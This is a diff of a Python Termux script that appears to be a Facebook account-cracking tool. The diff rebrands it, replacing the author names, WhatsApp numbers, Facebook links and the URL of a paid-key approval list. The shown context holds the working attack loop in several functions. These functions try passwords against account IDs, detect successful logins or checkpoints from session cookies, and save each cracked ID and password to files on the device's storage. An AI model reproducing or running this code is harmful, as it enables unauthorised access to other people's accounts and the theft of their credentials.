@@ -91,7 +91,7 @@ def back():
 
 ahsan="Mr-"
 imt="-2.0=="
-ak="K4US4R-"
+ak="RAKIB-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrkausar-cov', 'r').read()
@@ -117,21 +117,24 @@ if ltx > 12:
 else:
     a = ltx
     tag = "AM"
-logo =f"""{BLUE}########.....###....##....##.########...#######..##.....##
-.##.....##...##.##...###...##.##.....##.##.....##.###...###
-.##.....##..##...##..####..##.##.....##.##.....##.####.####
-.########..##.....##.##.##.##.##.....##.##.....##.##.###.##
-.##...##...#########.##..####.##.....##.##.....##.##.....##
-.##....##..##.....##.##...###.##.....##.##.....##.##.....##
-.##.....##.##.....##.##....##.########...#######..##.....##
-\033[1;37m╔R⃠K⃠S⃠═════════════════\033[1;33𝕾𝕬𝕴𝕷𝕰𝕹𝕿 𝕳𝕬𝕮𝕶𝕰𝕽\033[1;37m══════════════R⃠K⃠S⃠╗
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝙷𝙰𝙳𝙸 𝙰𝙽𝙷𝙰𝙵 𝙰𝙸𝙼𝙰𝙽   \033[1;31m
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝙷𝙰𝙳𝙸 𝙰𝙽𝙷𝙰𝙵 𝙰𝙸𝙼𝙰𝙽\033[1;31m     
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝙰𝚔𝚊𝚜𝚑-𝚁𝙺𝚂             \033[1;31m 
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+8801721474011             \033[1;31m 
+logo =f"""{BLUE}.sSSSsSS SSsSSSSS .sSSSSs.            .sSSSSs.    .sSSSSs.    .sSSS  SSSSS  SSSSS .sSSSSs.    
+SSSSS  SSS  SSSSS SSSSSSSSSs.         SSSSSSSSSs. SSSSSSSSSs. SSSSS  SSSSS  SSSSS SSSSSSSSSs. 
+S SSS   S   SSSSS S SSS SSSSS         S SSS SSSSS S SSS SSSSS S SSS SSSSS   S SSS S SSS SSSSS 
+S  SS       SSSSS S  SS SSSS'         S  SS SSSS' S  SS SSSSS S  SS SSSSS   S  SS S  SS SSSS' 
+S..SS       SSSSS S..SSsSSSa. sssssss S..SSsSSSa. S..SSsSSSSS S..SSsSSSSS   S..SS S..SSsSSSa. 
+S:::S       SSSSS S:::S SSSSS         S:::S SSSSS S:::S SSSSS S:::S SSSSS   S:::S S:::S SSSSS 
+S;;;S       SSSSS S;;;S SSSSS         S;;;S SSSSS S;;;S SSSSS S;;;S  SSSSS  S;;;S S;;;S SSSSS 
+S%%%S       SSSSS S%%%S SSSSS         S%%%S SSSSS S%%%S SSSSS S%%%S  SSSSS  S%%%S S%%%S SSSSS 
+SSSSS       SSSSS SSSSS SSSSS         SSSSS SSSSS SSSSS SSSSS SSSSS   SSSSS SSSSS SSSSSsSSSS' 
+                                                                                              
+\033[1;37m╔═════════════════\033[1;33\033[1;37m══════════════╗
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mMR RAKIB   \033[1;31m
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mMD RAKIB HOSSEN \033[1;31m     
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mMRRAKIB404CYBER          \033[1;31m 
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+9660531382117            \033[1;31m 
 \033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m 3.1                   \033[1;31m   
 \033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m 🌹RANDOM🌹            \033[1;31m   
-\033[1;37m╚R⃠K⃠S⃠❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️ \033[1;37mR⃠K⃠S⃠╝
+\033[1;37m╚❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️ \033[1;37m╝
 \033[1;91m==========================================================
 \033[31;44m EVERYONE THINKS OF CHANGING THE WORLD     
  BUT NO ONE THINKS OF CHANGING HIMSELF.. 🍂\033[0;m
@@ -278,9 +281,9 @@ def xyz():
         Tabii2()
         
     elif RAKIB in ["3","03"]:
-        os.system("xdg-open https://www.facebook.com/owner.termux");xyz()
+        os.system("xdg-open https://www.facebook.com/Itz.AriYaN.Sakib.Take.love");xyz()
     elif RAKIB in ["4","04"]:
-        os.system("xdg-open https://wa.me/+8801721474011");xyz()
+        os.system("xdg-open https://wa.me/+9660531382117");xyz()
     elif RAKIB in ["0","00"]:
        exit()
     else:
@@ -300,13 +303,13 @@ def password():
     print("")
     passX = input(f" {RED}CHOOSE{RAKIB2} : ")
     if passX in ['1','01']:
-        os.system("xdg-open https://www.facebook.com/owner.termux")
+        os.system("xdg-open https://www.facebook.com/Itz.AriYaN.Sakib.Take.love")
         password1()
     elif passX in ['2','02']:
-        os.system("xdg-open https://www.facebook.com/owner.termux")
+        os.system("xdg-open https://www.facebook.com/Itz.AriYaN.Sakib.Take.love")
         password2()
     elif passX in ['3','03']:
-        os.system("xdg-open https://www.facebook.com/owner.termux")
+        os.system("xdg-open https://www.facebook.com/Itz.AriYaN.Sakib.Take.love")
         password5()
     else:
         xyz()
@@ -399,32 +402,32 @@ def free1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
-                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RAKIB_OK.mp3")
+                print('\r\033[1;32m[RAKIB-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
-                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_2F.mp3")
+                    print('\r\033[1;34m[RAKIB-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RAKIB-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
-                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_CP.mp3")
+                    print(f'\r\033[1;30m[RAKIB-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RAKIB 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -522,18 +525,18 @@ def free2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
-                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RAKIB_OK.mp3")
+                print('\r\033[1;32m[RAKIB-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
-                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_2F.mp3")
+                    print('\r\033[1;34m[RAKIB-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RAKIB-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -547,7 +550,7 @@ def free2(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RAKIB 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -648,23 +651,23 @@ def free(uid,pwx,tl):
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
-                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_2F.mp3")
+                    print('\r\033[1;34m[RAKIB-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RAKIB-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
-                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_CP.mp3")
+                    print(f'\r\033[1;30m[RAKIB-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RAKIB 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -752,32 +755,32 @@ def m(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
-                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RAKIB_OK.mp3")
+                print('\r\033[1;32m[RAKIB-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
-                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_2F.mp3")
+                    print('\r\033[1;34m[RAKIB-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RAKIB-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
-                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RAKIB_CP.mp3")
+                    print(f'\r\033[1;30m[RAKIB-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RAKIB 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -786,7 +789,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrkausar-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/NAHID-AFRIDY/NAHID-YT/blob/main/Approved.txt").text
+	r1=requests.get("https://github.com/robiul-cyber404/RDX9/blob/main/appro.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -799,7 +802,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m NAHID Tool Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m RAKIB Tool Paid You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
